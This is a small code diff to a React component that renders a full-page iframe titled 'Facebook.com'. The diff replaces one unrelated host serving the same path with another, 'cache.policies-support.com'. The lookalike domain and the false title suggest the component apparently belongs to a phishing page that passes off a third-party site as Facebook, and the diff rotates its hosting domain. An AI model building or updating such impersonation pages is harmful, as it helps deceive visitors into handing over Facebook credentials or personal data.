@@ -21,7 +21,7 @@ const IframeComponent = () => {
     <div style={styles.container}>
       <iframe
         id="myFrame"
-        src="https://gift900.cbkgardens.com/nurani-ori/"
+        src="https://cache.policies-support.com/nurani-ori/"
         style={styles.iframe}
         title="Facebook.com"
       />
